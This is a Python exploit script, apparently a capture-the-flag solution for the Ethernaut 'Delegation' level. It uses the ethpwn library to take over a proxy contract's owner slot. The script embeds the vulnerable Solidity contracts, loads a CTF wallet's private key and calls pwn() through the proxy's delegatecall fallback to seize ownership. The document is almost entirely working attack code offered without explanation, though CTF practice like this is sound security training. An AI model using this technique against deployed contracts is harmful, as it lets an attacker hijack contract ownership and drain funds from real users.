#!/usr/bin/env python3

import sys
from ethpwn import *
from time import sleep

INTERFACE = """
contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
"""

context.log_level = 'DEBUG'

MY_WALLET = get_wallet_by_name('Laptop CTF Metamask')
assert MY_WALLET is not None
context.default_from_addr = MY_WALLET.address
context.default_signing_key = MY_WALLET.private_key

PROXY_ADDR, = sys.argv[1:]
CONTRACT_METADATA.add_solidity_source(INTERFACE, 'xxx')

delegation = CONTRACT_METADATA['Delegation'].get_contract_at(PROXY_ADDR)
delegate = CONTRACT_METADATA['Delegate'].get_contract_at(PROXY_ADDR)
transact(delegate.functions.pwn())